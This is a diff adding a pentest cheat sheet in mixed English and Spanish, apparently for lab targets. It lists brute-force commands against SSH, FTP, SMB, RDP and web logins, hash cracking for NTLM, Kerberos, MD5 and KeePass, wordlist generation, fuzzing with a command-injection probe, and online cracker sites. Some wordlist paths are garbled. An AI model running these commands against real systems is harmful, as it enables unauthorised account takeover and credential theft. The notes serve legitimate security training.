@@ -1,0 +1,116 @@
+#Execute below command
+wfuzz -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.69/sync?FUZZ=ls -c --hh 19
+
+#Cewl crear diccionario en base a un sitio web:
+cewl http://10.10.10.46/ -m 4 -d 5 >> diccio_apocalyst.txt
+
+Fcrackzip
+Cracking a ZIP Password
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip
+-----------------------------------------------------
+
+Ncrack
+ncrack -vv --user offsec -P passwords rdp://10.10.10.10
+SSH user with password list
+--------------------------------------
+
+Cewl
+cewl http://<targetip>/ -m 6 -w cewl.txt
+wc -l cewl.txt
+john --wordlist=cewl.txt --rules --stdout > mutated.txt
+wc mutated.txt
+medusa -h <targetip> -u admin -P mutated.txt -M http -n 80 -m DIR:/directory/to/login/panel -T 30
+
+-----------------------------------
+
+Hydra
+
+hydra -l root -P /usr/share/wordlısts/rockyou.txt <targetip> ssh
+hydra -L userlist.txt -P /usr/share/wordlısts/rockyou.txt <targetip> -s 22 ssh -V
+hydra 10.10.10.52 -l username -P /usr/share/wordlists/list ftp|ssh|smb://10.0.0.1
+
+# FUZZING SSH con hydra 
+hydra -l user -P pass.txt -t 10 10.10.10.10 ssh -s 22
+
+
+# FUZZING SMB con HYDRA:
+hydra -L user.txt -P pass.txt 192.168.1.101 smb
+
+
+# FUZZING FTP CON HYDRA:
+hydra -L user.txt -P user.txt 10.0.2.22 ftp
+el -L con el archivo de usuarios y el -P con el archivo de pass y se especifica que el protocolo es ftp.
+
+# crack web passwords
+http-post-form can change as user module changes
+Invalid: what message does the page give for wrong creds
+for parameters check with burp
+
+hydra -l admin -P /usr/share/seclists/Passwords/10k_most_common.txt <targetip> http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64 
+
+-----------------------------------
+
+Medusa
+medusa -h <targetip> -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/test -T 10
+medusa -h 10.10.10.10 -u user -P passwords.txt -M ftp
+
+-----------------------------------
+
+Hashcat
+
+# learn the hash type from hashcat.net example hashes page and pass as its m value
+# or you can learn with the following command
+hashcat -h | grep -i lm
+hashcat -m 1600 hashes /usr/share/wordlists/rockyou.txt
+
+-----------------------------------
+
+LM/NTLM
+hashcat -h | grep -i lm 
+hashcat -m 3000  hashes --rules --wordlist=/usr/share/wordlists/rockyou.txt
+
+https://hashkiller.co.uk/
+
+------------------------------------------
+
+When you find some digits, check if it's 32 bit
+echo -n ....... | wc -c
+
+------------------------------------------
+John
+john hashes.txt --rules --wordlist=/usr/share/wordlists/rockyou.txt 
+
+----------------------------------------------------------------
+
+Cracking Web Forms with Hydra
+hydra 10.10.10.52 http-post-form -L /usr/share/wordlists/list "/endpoit/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s PORT -P /usr/share/wordlists/list
+
+------------------------------------------------------------------------
+
+CRACKING HASHES:
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt /root/hash.txt
+             kerberos
+			 
+# KEEPASS FUZZING
+keepass2john CEH.kdbx > hash
+Creamos el hash del archivo.
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+El diccionario y el archivo hash es donde saque el hash, en na de tiempo saco la pass.
+
+# PARA ENCONTRAR  SUBDOMINIOS:
+wfuzz -c -w ./subdomains-top1million-5000.txt --hl 0 -H "Host: FUZZ.bart.htb" -u http://10.10.10.81
+
+# Online Password Crackers:
+https://hashkiller.co.uk/Cracker
+https://www.cmd5.org/
+https://www.onlinehashcrack.com/
+https://gpuhash.me/
+https://crackstation.net/
+https://crack.sh/
+https://hash.help/
+https://passwordrecovery.io/
+http://cracker.offensive-security.com/
+https://hashes.org/search.php
+https://www.browserling.com/tools/ip-to-dec
+https://www.w3schools.com/tags/ref_urlencode.ASP
